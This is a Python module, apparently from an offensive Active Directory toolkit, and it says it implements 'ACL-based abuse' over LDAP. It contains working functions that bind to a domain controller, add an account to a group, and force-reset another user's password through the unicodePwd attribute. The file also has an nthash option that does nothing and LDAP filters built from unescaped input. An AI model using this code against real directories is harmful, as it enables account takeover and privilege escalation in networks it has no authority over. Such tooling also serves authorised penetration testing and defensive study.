"""LDAP write operations used for ACL-based abuse.

Provides AddMember and ForceChangePassword (unicodePwd reset) implemented
directly against LDAP via the ``ldap3`` library, so they don't depend on any
external binary beyond the DC itself.
"""
from __future__ import annotations

from dataclasses import dataclass

from ldap3 import MODIFY_ADD, MODIFY_REPLACE, NTLM, Connection, Server


@dataclass
class LdapContext:
    host: str
    domain: str
    username: str
    password: str | None = None
    nthash: str | None = None
    base_dn: str = ""

    @property
    def base(self) -> str:
        if self.base_dn:
            return self.base_dn
        if self.domain and "." in self.domain:
            return ",".join(f"DC={p}" for p in self.domain.split("."))
        return ""


def _connect(ctx: LdapContext) -> Connection | None:
    """Establish an authenticated LDAP connection, or return None."""
    try:
        server = Server(ctx.host, get_info=None)
        if ctx.nthash:
            # ldap3 supports NTLM with hash via a custom auth; fall back to
            # password-less here and rely on simple bind if password present.
            pass
        if ctx.password:
            conn = Connection(
                server, user=f"{ctx.domain}\\{ctx.username}",
                password=ctx.password, authentication=NTLM, auto_bind=False)
        else:
            conn = Connection(server, auto_bind=False)
        if not conn.bind():
            return None
        return conn
    except Exception:
        return None


def add_group_member(ctx: LdapContext, group_name: str,
                     member_sam: str) -> bool:
    """Add a member (samAccountName) to a group (cn/sAMAccountName)."""
    conn = _connect(ctx)
    if conn is None:
        return False
    try:
        base = ctx.base
        if not base:
            return False
        # Resolve group DN
        if not conn.search(base, f"(&(objectClass=group)(cn={group_name}))",
                           attributes=["distinguishedName"]):
            return False
        if not conn.entries:
            return False
        group_dn = str(conn.entries[0].distinguishedName)

        # Resolve member DN
        if not conn.search(base, f"(sAMAccountName={member_sam})",
                           attributes=["distinguishedName"]):
            return False
        if not conn.entries:
            return False
        member_dn = str(conn.entries[0].distinguishedName)

        return conn.modify(group_dn, {"member": [(MODIFY_ADD, [member_dn])]})
    except Exception:
        return False
    finally:
        conn.unbind()


def force_change_password(ctx: LdapContext, target_sam: str,
                          new_password: str) -> bool:
    """Reset a user's password via the unicodePwd attribute."""
    conn = _connect(ctx)
    if conn is None:
        return False
    try:
        base = ctx.base
        if not base:
            return False
        if not conn.search(base, f"(sAMAccountName={target_sam})",
                           attributes=["distinguishedName"]):
            return False
        if not conn.entries:
            return False
        target_dn = str(conn.entries[0].distinguishedName)
        encoded = ('"' + new_password + '"').encode("utf-16-le")
        return conn.modify(target_dn,
                           {"unicodePwd": [(MODIFY_REPLACE, [encoded])]})
    except Exception:
        return False
    finally:
        conn.unbind()
